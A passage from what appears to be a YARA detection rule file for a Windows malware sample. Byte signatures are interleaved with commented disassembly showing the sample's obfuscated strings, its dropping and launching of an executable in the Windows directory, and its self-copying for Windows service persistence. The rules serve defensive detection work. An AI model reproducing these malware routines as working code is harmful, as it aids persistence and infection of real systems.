        .text:0x00407343  c645e66e         mov byte [ebp - 26],110
        .text:0x00407347  c645e76e         mov byte [ebp - 25],110
        .text:0x0040734b  c645e865         mov byte [ebp - 24],101
        .text:0x0040734f  c645e963         mov byte [ebp - 23],99
        .text:0x00407353  c645ea74         mov byte [ebp - 22],116
        .text:0x00407357  c645eb47         mov byte [ebp - 21],71
        .text:0x0040735b  c645ec72         mov byte [ebp - 20],114
        .text:0x0040735f  c645ed6f         mov byte [ebp - 19],111
        .text:0x00407363  c645ee75         mov byte [ebp - 18],117
        .text:0x00407367  c645ef70         mov byte [ebp - 17],112
        .text:0x0040736b  c645f000         mov byte [ebp - 16],0
        .text:0x0040736f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407371  53               push ebx
        .text:0x00407372  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407374  53               push ebx
        .text:0x00407375  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407377  53               push ebx
        .text:0x00407378  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040737a  8d85acf8ffff     lea eax,dword [ebp - 1876]
        .text:0x00407380  6800040000       push 1024
        .text:0x00407385  8d4de4           lea ecx,dword [ebp - 28]
        .text:0x00407388  50               push eax
        .text:0x00407389  51               push ecx
        .text:0x0040738a  6818a24000       push 0x0040a218
        .text:0x0040738f  e8ccdbffff       call 0x00404f60    ;sub_00404f60(0x0040a218,local32,local1880,1024)
        .text:0x00407394  83c410           add esp,16
        .text:0x00407397  53               push ebx
        .text:0x00407398  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040739a  53               push ebx
        .text:0x0040739b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040739d  53               push ebx
        .text:0x0040739e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004073a0  8d95acf8ffff     lea edx,dword [ebp - 1876]
        .text:0x004073a6  52               push edx
        .text:0x004073a7  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(local1880)
        .text:0x004073ad  85c0             test eax,eax
        .text:0x004073af  751f             jnz 0x004073d0
        .text:0x004073b1  53               push ebx
        .text:0x004073b2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004073b4  6892a44000       push 0x0040a492
        .text:0x004073b9  6818a24000       push 0x0040a218
        .text:0x004073be  e85dc1ffff       call 0x00403520    ;sub_00403520(kernel32.Sleep(0),local1880,local32,0x0040a218,0x0040a492)
        .text:0x004073c3  6818a24000       push 0x0040a218
        .text:0x004073c8  e883f2ffff       call 0x00406650    ;sub_00406650(0x0040a218)
        .text:0x004073cd  83c40c           add esp,12
        .text:0x004073d0  loc_004073d0: [1 XREFS]
        .text:0x004073d0  53               push ebx
        .text:0x004073d1  66891d10ac4000   mov word [0x0040ac10],bx
        .text:0x004073d8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004073da  e841f5ffff       call 0x00406920    ;sub_00406920()
        .text:0x004073df  5f               pop edi
        .text:0x004073e0  5e               pop esi
        .text:0x004073e1  33c0             xor eax,eax
        .text:0x004073e3  5b               pop ebx
        .text:0x004073e4  8be5             mov esp,ebp
        .text:0x004073e6  5d               pop ebp
        .text:0x004073e7  c21000           ret 16
        */
        $c37 = { 55 8B EC 81 EC 54 07 00 00 53 56 8B 35 ?? ?? ?? ?? 33 DB 57 53 FF D6 53 FF D6 90 90 90 90 90 90 90 90 90 53 FF D6 90 53 53 53 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 53 FF D6 90 FF 15 ?? ?? ?? ?? 53 FF D6 90 53 53 8D 45 ?? 53 50 FF 15 ?? ?? ?? ?? 53 FF D6 90 B9 FF 00 00 00 33 C0 8D BD ?? ?? ?? ?? 88 9D ?? ?? ?? ?? F3 AB 66 AB 68 54 03 00 00 68 18 A2 40 00 AA E8 ?? ?? ?? ?? 68 9A 01 00 00 68 78 A0 40 00 E8 ?? ?? ?? ?? 6A 01 E8 ?? ?? ?? ?? 83 C4 14 85 C0 74 ?? 53 FF D6 90 39 1D ?? ?? ?? ?? 74 ?? E8 ?? ?? ?? ?? 53 FF D6 90 5F 5E 33 C0 5B 8B E5 5D C2 10 00 B9 40 00 00 00 33 C0 8D BD ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 00 F3 AB 66 AB 53 AA FF D6 8D 8D ?? ?? ?? ?? 68 04 01 00 00 51 68 FC A3 40 00 FF 15 ?? ?? ?? ?? 53 FF D6 8B 0D ?? ?? ?? ?? 8D 95 ?? ?? ?? ?? 52 68 FC A3 40 00 E8 ?? ?? ?? ?? 53 FF D6 8B 0D ?? ?? ?? ?? 68 FC A3 40 00 E8 ?? ?? ?? ?? 80 B8 ?? ?? ?? ?? 5C 75 ?? 8B 0D ?? ?? ?? ?? 68 FC A3 40 00 E8 ?? ?? ?? ?? C6 80 ?? ?? ?? ?? 00 53 C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 5C C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 00 FF D6 68 60 A4 40 00 8D 45 ?? 68 FC A3 40 00 50 68 D8 AA 40 00 E8 ?? ?? ?? ?? 83 C4 10 53 FF D6 8B 0D ?? ?? ?? ?? 68 E0 A0 40 00 68 34 AC 40 00 E8 ?? ?? ?? ?? 53 FF D6 39 1D ?? ?? ?? ?? 74 ?? E8 ?? ?? ?? ?? A0 ?? ?? ?? ?? 84 C0 0F 84 ?? ?? ?? ?? B9 40 00 00 00 33 C0 8D BD ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 00 F3 AB 66 AB 53 AA FF D6 8D 8D ?? ?? ?? ?? 68 04 01 00 00 51 53 FF 15 ?? ?? ?? ?? 53 FF D6 8B 0D ?? ?? ?? ?? 8D 95 ?? ?? ?? ?? 68 D8 AA 40 00 52 E8 ?? ?? ?? ?? 85 C0 75 ?? A0 ?? ?? ?? ?? 66 C7 05 ?? ?? ?? ?? 03 00 3C 02 75 ?? 53 FF D6 53 C7 45 ?? 18 A2 40 00 C7 45 ?? A0 6D 40 00 89 5D ?? 89 5D ?? FF D6 53 66 C7 05 ?? ?? ?? ?? 01 00 FF D6 90 68 F4 01 00 00 FF D6 53 FF D6 8B 3D ?? ?? ?? ?? 8D 45 ?? 50 FF D7 53 FF D6 68 E8 03 00 00 FF D6 53 FF D6 8D 4D ?? 51 FF D7 53 FF D6 66 C7 05 ?? ?? ?? ?? 02 00 E8 ?? ?? ?? ?? 5F 5E 33 C0 5B 8B E5 5D C2 10 00 6A 00 89 5D ?? FF D6 B9 40 00 00 00 33 C0 8D BD ?? ?? ?? ?? C6 85 ?? ?? ?? ?? 00 F3 AB 66 AB 6A 00 C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 5C C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 00 AA FF D6 68 60 A4 40 00 8D 55 ?? 68 FC A3 40 00 8D 85 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 68 92 A4 40 00 68 18 A2 40 00 E8 ?? ?? ?? ?? 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 1C 6A 00 FF D6 68 FC A2 40 00 68 7C A2 40 00 8D 8D ?? ?? ?? ?? 68 18 A2 40 00 51 E8 ?? ?? ?? ?? 8B 3D ?? ?? ?? ?? 83 C4 10 6A 00 FF D6 68 60 A4 40 00 E8 ?? ?? ?? ?? 83 C4 04 85 C0 75 ?? 8B 45 ?? 40 3D B8 0B 00 00 89 45 ?? 72 ?? 6A 00 C7 45 ?? 00 00 00 00 C6 45 ?? 6F C6 45 ?? 70 C6 45 ?? 65 C6 45 ?? 6E C6 45 ?? 00 FF D6 6A 05 6A 00 8D 95 ?? ?? ?? ?? 6A 00 8D 45 ?? 52 50 6A 00 FF D7 6A 00 FF D6 43 83 FB 03 73 ?? EB ?? 6A 00 FF D6 80 3D ?? ?? ?? ?? 01 75 ?? 8D 8D ?? ?? ?? ?? 51 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 08 6A 00 FF D6 A1 ?? ?? ?? ?? 85 C0 74 ?? E8 ?? ?? ?? ?? 6A 00 FF D6 5F 5E 33 C0 5B 8B E5 5D C2 10 00 53 C6 45 ?? 25 C6 45 ?? 73 C6 45 ?? 00 FF D6 8D 55 ?? 68 18 A2 40 00 52 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 0C 53 FF D6 53 FF D6 53 C6 45 ?? 43 C6 45 ?? 6F C6 45 ?? 6E C6 45 ?? 6E C6 45 ?? 65 C6 45 ?? 63 C6 45 ?? 74 C6 45 ?? 47 C6 45 ?? 72 C6 45 ?? 6F C6 45 ?? 75 C6 45 ?? 70 C6 45 ?? 00 FF D6 53 FF D6 53 FF D6 53 FF D6 8D 85 ?? ?? ?? ?? 68 00 04 00 00 8D 4D ?? 50 51 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 10 53 FF D6 53 FF D6 53 FF D6 8D 95 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 85 C0 75 ?? 53 FF D6 68 92 A4 40 00 68 18 A2 40 00 E8 ?? ?? ?? ?? 68 18 A2 40 00 E8 ?? ?? ?? ?? 83 C4 0C 53 66 89 1D ?? ?? ?? ?? FF D6 E8 ?? ?? ?? ?? 5F 5E 33 C0 5B 8B E5 5D C2 10 00 }
        /*
function at 0x00402950@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - get common file path
        .text:0x00402950  
        .text:0x00402950  FUNC: int bfastcall_caller sub_00402950( int eax, int edx, int ecx, int arg3, ) [4 XREFS] 
        .text:0x00402950  
        .text:0x00402950  Stack Variables: (offset from initial top of stack)
        .text:0x00402950             4: int arg3
        .text:0x00402950            -4: int local4
        .text:0x00402950            -5: int local5
        .text:0x00402950            -6: int local6
        .text:0x00402950            -7: int local7
        .text:0x00402950            -8: int local8
        .text:0x00402950            -9: int local9
        .text:0x00402950           -10: int local10
        .text:0x00402950           -11: int local11
        .text:0x00402950           -12: int local12
        .text:0x00402950  
        .text:0x00402950  83ec0c           sub esp,12
        .text:0x00402953  56               push esi
        .text:0x00402954  8b3578904000     mov esi,dword [0x00409078]
        .text:0x0040295a  57               push edi
        .text:0x0040295b  b15c             mov cl,92
        .text:0x0040295d  b073             mov al,115
        .text:0x0040295f  6a00             push 0
        .text:0x00402961  884c240c         mov byte [esp + 12],cl
        .text:0x00402965  8844240d         mov byte [esp + 13],al
        .text:0x00402969  c644240e79       mov byte [esp + 14],121
        .text:0x0040296e  8844240f         mov byte [esp + 15],al
        .text:0x00402972  c644241074       mov byte [esp + 16],116
        .text:0x00402977  c644241165       mov byte [esp + 17],101
        .text:0x0040297c  c64424126d       mov byte [esp + 18],109
        .text:0x00402981  884c2413         mov byte [esp + 19],cl
        .text:0x00402985  c644241400       mov byte [esp + 20],0
        .text:0x0040298a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040298c  b941000000       mov ecx,65
        .text:0x00402991  33c0             xor eax,eax
        .text:0x00402993  bfb8a84000       mov edi,0x0040a8b8
        .text:0x00402998  50               push eax
        .text:0x00402999  f3ab             rep: stosd 
        .text:0x0040299b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040299d  6804010000       push 260
        .text:0x004029a2  68b8a84000       push 0x0040a8b8
        .text:0x004029a7  ff15b8904000     call dword [0x004090b8]    ;kernel32.GetWindowsDirectoryA(0x0040a8b8,260)
        .text:0x004029ad  6a00             push 0
        .text:0x004029af  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004029b1  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004029b7  8d442408         lea eax,dword [esp + 8]
        .text:0x004029bb  50               push eax
        .text:0x004029bc  68b8a84000       push 0x0040a8b8
        .text:0x004029c1  e8ea1c0000       call 0x004046b0    ;sub_004046b0(0x0040a8b8,local12)
        .text:0x004029c6  8b4c2418         mov ecx,dword [esp + 24]
        .text:0x004029ca  51               push ecx
        .text:0x004029cb  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004029d1  68b8a84000       push 0x0040a8b8
        .text:0x004029d6  e8d51c0000       call 0x004046b0    ;sub_004046b0(0x0040a8b8,arg3)
        .text:0x004029db  5f               pop edi
        .text:0x004029dc  5e               pop esi
        .text:0x004029dd  83c40c           add esp,12
        .text:0x004029e0  c3               ret 
        */
        $c38 = { 83 EC 0C 56 8B 35 ?? ?? ?? ?? 57 B1 5C B0 73 6A 00 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 79 88 44 24 ?? C6 44 24 ?? 74 C6 44 24 ?? 65 C6 44 24 ?? 6D 88 4C 24 ?? C6 44 24 ?? 00 FF D6 B9 41 00 00 00 33 C0 BF B8 A8 40 00 50 F3 AB FF D6 68 04 01 00 00 68 B8 A8 40 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 0D ?? ?? ?? ?? 8D 44 24 ?? 50 68 B8 A8 40 00 E8 ?? ?? ?? ?? 8B 4C 24 ?? 51 8B 0D ?? ?? ?? ?? 68 B8 A8 40 00 E8 ?? ?? ?? ?? 5F 5E 83 C4 0C C3 }
        /*
function at 0x00403a40@9324d1a8ae37a36ae560c37448c9705a with 3 features:
          - check if file exists
          - get common file path
          - write file on Windows
        .text:0x00403a40  
        .text:0x00403a40  FUNC: int stdcall sub_00403a40( int arg0, int arg1, int arg2, ) [4 XREFS] 
        .text:0x00403a40  
        .text:0x00403a40  Stack Variables: (offset from initial top of stack)
        .text:0x00403a40            12: int arg2
        .text:0x00403a40             8: int arg1
        .text:0x00403a40             4: int arg0
        .text:0x00403a40          -260: int local260
        .text:0x00403a40          -312: int local312
        .text:0x00403a40          -316: int local316
        .text:0x00403a40          -319: int local319
        .text:0x00403a40          -320: int local320
        .text:0x00403a40          -321: int local321
        .text:0x00403a40          -322: int local322
        .text:0x00403a40          -323: int local323
        .text:0x00403a40          -324: int local324
        .text:0x00403a40          -325: int local325
        .text:0x00403a40          -326: int local326
        .text:0x00403a40          -327: int local327
        .text:0x00403a40          -328: int local328
        .text:0x00403a40          -332: int local332
        .text:0x00403a40          -333: int local333
        .text:0x00403a40          -334: int local334
        .text:0x00403a40          -335: int local335
        .text:0x00403a40          -336: int local336
        .text:0x00403a40  
        .text:0x00403a40  81ec50010000     sub esp,336
        .text:0x00403a46  56               push esi
        .text:0x00403a47  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00403a4d  57               push edi
        .text:0x00403a4e  6a00             push 0
        .text:0x00403a50  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403a52  8d442454         lea eax,dword [esp + 84]
        .text:0x00403a56  6804010000       push 260
        .text:0x00403a5b  50               push eax
        .text:0x00403a5c  ff15b8904000     call dword [0x004090b8]    ;kernel32.GetWindowsDirectoryA(local260,260)
        .text:0x00403a62  b045             mov al,69
        .text:0x00403a64  6a00             push 0
        .text:0x00403a66  c64424145c       mov byte [esp + 20],92
        .text:0x00403a6b  c644241552       mov byte [esp + 21],82
        .text:0x00403a70  c644241675       mov byte [esp + 22],117
        .text:0x00403a75  c644241725       mov byte [esp + 23],37
        .text:0x00403a7a  c644241864       mov byte [esp + 24],100
        .text:0x00403a7f  c64424192e       mov byte [esp + 25],46
        .text:0x00403a84  8844241a         mov byte [esp + 26],al
        .text:0x00403a88  c644241b58       mov byte [esp + 27],88
        .text:0x00403a8d  8844241c         mov byte [esp + 28],al
        .text:0x00403a91  c644241d00       mov byte [esp + 29],0
        .text:0x00403a96  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403a98  ff15d0904000     call dword [0x004090d0]    ;kernel32.GetTickCount()
        .text:0x00403a9e  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00403aa2  50               push eax
        .text:0x00403aa3  8d542424         lea edx,dword [esp + 36]
        .text:0x00403aa7  51               push ecx
        .text:0x00403aa8  52               push edx
        .text:0x00403aa9  ff15d8914000     call dword [0x004091d8]    ;user32.wsprintfA(local312,local328)
        .text:0x00403aaf  83c40c           add esp,12
        .text:0x00403ab2  6a00             push 0
        .text:0x00403ab4  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403ab6  8d442420         lea eax,dword [esp + 32]
        .text:0x00403aba  8d4c2454         lea ecx,dword [esp + 84]
        .text:0x00403abe  50               push eax
        .text:0x00403abf  51               push ecx
        .text:0x00403ac0  ff15cc904000     call dword [0x004090cc]    ;kernel32.lstrcatA(local260,local312)
        .text:0x00403ac6  6a00             push 0
        .text:0x00403ac8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403aca  6a00             push 0
        .text:0x00403acc  6880000000       push 128
        .text:0x00403ad1  6a02             push 2
        .text:0x00403ad3  6a00             push 0
        .text:0x00403ad5  6a02             push 2
        .text:0x00403ad7  8d542468         lea edx,dword [esp + 104]
        .text:0x00403adb  6800000040       push 0x40000000
        .text:0x00403ae0  52               push edx
        .text:0x00403ae1  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(local260,0x40000000,2,0,2,128,0)
        .text:0x00403ae7  6a00             push 0
        .text:0x00403ae9  8bf8             mov edi,eax
        .text:0x00403aeb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403aed  83ffff           cmp edi,0xffffffff
        .text:0x00403af0  0f849a000000     jz 0x00403b90
        .text:0x00403af6  6a00             push 0
        .text:0x00403af8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403afa  8b8c2460010000   mov ecx,dword [esp + 352]
        .text:0x00403b01  8b94245c010000   mov edx,dword [esp + 348]
        .text:0x00403b08  8d44241c         lea eax,dword [esp + 28]
        .text:0x00403b0c  6a00             push 0
        .text:0x00403b0e  50               push eax
        .text:0x00403b0f  51               push ecx
        .text:0x00403b10  52               push edx
        .text:0x00403b11  57               push edi
        .text:0x00403b12  ff15a4904000     call dword [0x004090a4]    ;kernel32.WriteFile(kernel32.CreateFileA(local260,0x40000000,2,0,2,128,0),arg0,arg1,local316,0)
        .text:0x00403b18  6a00             push 0
        .text:0x00403b1a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b1c  57               push edi
        .text:0x00403b1d  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x00403ae1>)
        .text:0x00403b23  83bc246401000002 cmp dword [esp + 356],2
        .text:0x00403b2b  7463             jz 0x00403b90
        .text:0x00403b2d  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00403b33  8d442454         lea eax,dword [esp + 84]
        .text:0x00403b37  6a2e             push 46
        .text:0x00403b39  50               push eax
        .text:0x00403b3a  e8d10d0000       call 0x00404910    ;sub_00404910(local260,46)
        .text:0x00403b3f  85c0             test eax,eax
        .text:0x00403b41  744d             jz 0x00403b90
        .text:0x00403b43  6a00             push 0
        .text:0x00403b45  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b47  8d4c2454         lea ecx,dword [esp + 84]
        .text:0x00403b4b  c64424086f       mov byte [esp + 8],111
        .text:0x00403b50  51               push ecx
        .text:0x00403b51  c644240d70       mov byte [esp + 13],112
        .text:0x00403b56  c644240e65       mov byte [esp + 14],101
        .text:0x00403b5b  c644240f6e       mov byte [esp + 15],110
        .text:0x00403b60  c644241000       mov byte [esp + 16],0
        .text:0x00403b65  ff15bc904000     call dword [0x004090bc]    ;kernel32.GetFileAttributesA(local260)
        .text:0x00403b6b  83f8ff           cmp eax,0xffffffff
        .text:0x00403b6e  7420             jz 0x00403b90
        .text:0x00403b70  6a00             push 0
        .text:0x00403b72  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b74  6a05             push 5
        .text:0x00403b76  6a00             push 0
        .text:0x00403b78  8d54245c         lea edx,dword [esp + 92]
        .text:0x00403b7c  6a00             push 0
        .text:0x00403b7e  8d442414         lea eax,dword [esp + 20]
        .text:0x00403b82  52               push edx
        .text:0x00403b83  50               push eax
        .text:0x00403b84  6a00             push 0
        .text:0x00403b86  ff15ac914000     call dword [0x004091ac]    ;shell32.ShellExecuteA(0,local336,local260,0,0,5)
        .text:0x00403b8c  6a00             push 0
        .text:0x00403b8e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00403b90  loc_00403b90: [4 XREFS]
        .text:0x00403b90  5f               pop edi
        .text:0x00403b91  33c0             xor eax,eax
        .text:0x00403b93  5e               pop esi
        .text:0x00403b94  81c450010000     add esp,336
        .text:0x00403b9a  c20c00           ret 12
        */
        $c39 = { 81 EC 50 01 00 00 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 8D 44 24 ?? 68 04 01 00 00 50 FF 15 ?? ?? ?? ?? B0 45 6A 00 C6 44 24 ?? 5C C6 44 24 ?? 52 C6 44 24 ?? 75 C6 44 24 ?? 25 C6 44 24 ?? 64 C6 44 24 ?? 2E 88 44 24 ?? C6 44 24 ?? 58 88 44 24 ?? C6 44 24 ?? 00 FF D6 FF 15 ?? ?? ?? ?? 8D 4C 24 ?? 50 8D 54 24 ?? 51 52 FF 15 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 68 80 00 00 00 6A 02 6A 00 6A 02 8D 54 24 ?? 68 00 00 00 40 52 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 83 FF FF 0F 84 ?? ?? ?? ?? 6A 00 FF D6 8B 8C 24 ?? ?? ?? ?? 8B 94 24 ?? ?? ?? ?? 8D 44 24 ?? 6A 00 50 51 52 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 57 FF 15 ?? ?? ?? ?? 83 BC 24 ?? ?? ?? ?? 02 74 ?? 8B 0D ?? ?? ?? ?? 8D 44 24 ?? 6A 2E 50 E8 ?? ?? ?? ?? 85 C0 74 ?? 6A 00 FF D6 8D 4C 24 ?? C6 44 24 ?? 6F 51 C6 44 24 ?? 70 C6 44 24 ?? 65 C6 44 24 ?? 6E C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 83 F8 FF 74 ?? 6A 00 FF D6 6A 05 6A 00 8D 54 24 ?? 6A 00 8D 44 24 ?? 52 50 6A 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 5F 33 C0 5E 81 C4 50 01 00 00 C2 0C 00 }
        /*
function at 0x004073f0@9324d1a8ae37a36ae560c37448c9705a with 6 features:
          - copy file
          - create service
          - modify service
          - persist via Windows service
          - set registry value
          - start service
        .text:0x004073f0  
        .text:0x004073f0  FUNC: int cdecl sub_004073f0( int arg0, int arg1, int arg2, int arg3, ) [2 XREFS] 
        .text:0x004073f0  
        .text:0x004073f0  Stack Variables: (offset from initial top of stack)
        .text:0x004073f0            16: int arg3
        .text:0x004073f0            12: int arg2
        .text:0x004073f0             8: int arg1
        .text:0x004073f0             4: int arg0
        .text:0x004073f0            -8: int local8
        .text:0x004073f0           -20: int local20
        .text:0x004073f0          -288: int local288
        .text:0x004073f0          -548: int local548
        .text:0x004073f0          -552: int local552
        .text:0x004073f0          -811: int local811
        .text:0x004073f0          -812: int local812
        .text:0x004073f0          -816: int local816
        .text:0x004073f0          -820: int local820
        .text:0x004073f0          -822: int local822
        .text:0x004073f0          -823: int local823
        .text:0x004073f0          -824: int local824
        .text:0x004073f0          -828: int local828
        .text:0x004073f0          -830: int local830
        .text:0x004073f0          -831: int local831
        .text:0x004073f0          -832: int local832
        .text:0x004073f0          -833: int local833
        .text:0x004073f0          -834: int local834
        .text:0x004073f0          -835: int local835
        .text:0x004073f0          -836: int local836
        .text:0x004073f0          -837: int local837
        .text:0x004073f0          -838: int local838
        .text:0x004073f0          -839: int local839
        .text:0x004073f0          -840: int local840
        .text:0x004073f0          -841: int local841
        .text:0x004073f0          -842: int local842
        .text:0x004073f0          -843: int local843
        .text:0x004073f0          -844: int local844
        .text:0x004073f0          -845: int local845
        .text:0x004073f0          -846: int local846
        .text:0x004073f0          -847: int local847
        .text:0x004073f0          -848: int local848
        .text:0x004073f0          -849: int local849
        .text:0x004073f0          -850: int local850
        .text:0x004073f0          -851: int local851
        .text:0x004073f0          -852: int local852
        .text:0x004073f0          -853: int local853
        .text:0x004073f0          -854: int local854
        .text:0x004073f0          -855: int local855
        .text:0x004073f0          -856: int local856
        .text:0x004073f0          -857: int local857
        .text:0x004073f0          -858: int local858
        .text:0x004073f0          -859: int local859
        .text:0x004073f0          -860: int local860
        .text:0x004073f0          -861: int local861
        .text:0x004073f0          -862: int local862
        .text:0x004073f0          -863: int local863
        .text:0x004073f0          -864: int local864
        .text:0x004073f0          -868: int local868
        .text:0x004073f0          -869: int local869
        .text:0x004073f0          -870: int local870
        .text:0x004073f0          -871: int local871
        .text:0x004073f0          -872: int local872
        .text:0x004073f0          -873: int local873
        .text:0x004073f0          -874: int local874
        .text:0x004073f0          -875: int local875
        .text:0x004073f0          -876: int local876
        .text:0x004073f0          -877: int local877
        .text:0x004073f0          -878: int local878
        .text:0x004073f0          -879: int local879
        .text:0x004073f0          -880: int local880
        .text:0x004073f0  
        .text:0x004073f0  55               push ebp
        .text:0x004073f1  8bec             mov ebp,esp
        .text:0x004073f3  6aff             push 0xffffffff
        .text:0x004073f5  68b8924000       push 0x004092b8
        .text:0x004073fa  68907e4000       push 0x00407e90
        .text:0x004073ff  64a100000000     fs: mov eax,dword [0x00000000]
        .text:0x00407405  50               push eax
        .text:0x00407406  64892500000000   fs: mov dword [0x00000000],esp
        .text:0x0040740d  81ec5c030000     sub esp,860
        .text:0x00407413  53               push ebx
        .text:0x00407414  56               push esi
        .text:0x00407415  57               push edi
        .text:0x00407416  c685d8fcffff00   mov byte [ebp - 808],0
        .text:0x0040741d  b940000000       mov ecx,64
        .text:0x00407422  33c0             xor eax,eax
        .text:0x00407424  8dbdd9fcffff     lea edi,dword [ebp - 807]
        .text:0x0040742a  f3ab             rep: stosd 
        .text:0x0040742c  66ab             stosd 
        .text:0x0040742e  aa               stosb 
        .text:0x0040742f  33db             xor ebx,ebx
        .text:0x00407431  53               push ebx
        .text:0x00407432  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00407438  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040743a  6804010000       push 260
        .text:0x0040743f  8d85d8fcffff     lea eax,dword [ebp - 808]
        .text:0x00407445  50               push eax
        .text:0x00407446  53               push ebx
        .text:0x00407447  ff1538914000     call dword [0x00409138]    ;kernel32.GetModuleFileNameA(0,local812,260)
        .text:0x0040744d  53               push ebx
        .text:0x0040744e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407450  c685ccfcffff25   mov byte [ebp - 820],37
        .text:0x00407457  c685cdfcffff73   mov byte [ebp - 819],115
        .text:0x0040745e  889dcefcffff     mov byte [ebp - 818],bl
        .text:0x00407464  53               push ebx
        .text:0x00407465  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407467  8b4d08           mov ecx,dword [ebp + 8]
        .text:0x0040746a  51               push ecx
        .text:0x0040746b  8d95ccfcffff     lea edx,dword [ebp - 820]
        .text:0x00407471  52               push edx
        .text:0x00407472  8d85e0fdffff     lea eax,dword [ebp - 544]
        .text:0x00407478  50               push eax
        .text:0x00407479  e8420a0000       call 0x00407ec0    ;msvcrt.sprintf(local548,local824)
        .text:0x0040747e  83c40c           add esp,12
        .text:0x00407481  53               push ebx
        .text:0x00407482  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407484  8d8de0fdffff     lea ecx,dword [ebp - 544]
        .text:0x0040748a  51               push ecx
        .text:0x0040748b  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00407491  e85ad2ffff       call 0x004046f0    ;sub_004046f0(local548)
        .text:0x00407496  50               push eax
        .text:0x00407497  8d95d8fcffff     lea edx,dword [ebp - 808]
        .text:0x0040749d  52               push edx
        .text:0x0040749e  8d85e0fdffff     lea eax,dword [ebp - 544]
        .text:0x004074a4  50               push eax
        .text:0x004074a5  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004074ab  e8e0d0ffff       call 0x00404590    ;sub_00404590(local548,local812,0,local548)
        .text:0x004074b0  85c0             test eax,eax
        .text:0x004074b2  746d             jz 0x00407521
        .text:0x004074b4  53               push ebx
        .text:0x004074b5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004074b7  8d8de0fdffff     lea ecx,dword [ebp - 544]
        .text:0x004074bd  51               push ecx
        .text:0x004074be  e8ddf0ffff       call 0x004065a0    ;sub_004065a0(local548)
        .text:0x004074c3  83c404           add esp,4
        .text:0x004074c6  53               push ebx
        .text:0x004074c7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004074c9  53               push ebx
        .text:0x004074ca  8d95e0fdffff     lea edx,dword [ebp - 544]
        .text:0x004074d0  52               push edx
        .text:0x004074d1  8d85d8fcffff     lea eax,dword [ebp - 808]
        .text:0x004074d7  50               push eax
        .text:0x004074d8  ff1564904000     call dword [0x00409064]    ;kernel32.CopyFileA(local812,local548,0)
        .text:0x004074de  53               push ebx
        .text:0x004074df  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004074e1  8d8de0fdffff     lea ecx,dword [ebp - 544]
        .text:0x004074e7  51               push ecx
        .text:0x004074e8  e813e3ffff       call 0x00405800    ;sub_00405800(local548)
        .text:0x004074ed  83c404           add esp,4
        .text:0x004074f0  53               push ebx
        .text:0x004074f1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004074f3  b941000000       mov ecx,65
        .text:0x004074f8  33c0             xor eax,eax
        .text:0x004074fa  8dbdd8fcffff     lea edi,dword [ebp - 808]
        .text:0x00407500  f3ab             rep: stosd 
        .text:0x00407502  53               push ebx
        .text:0x00407503  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00407505  8d95e0fdffff     lea edx,dword [ebp - 544]
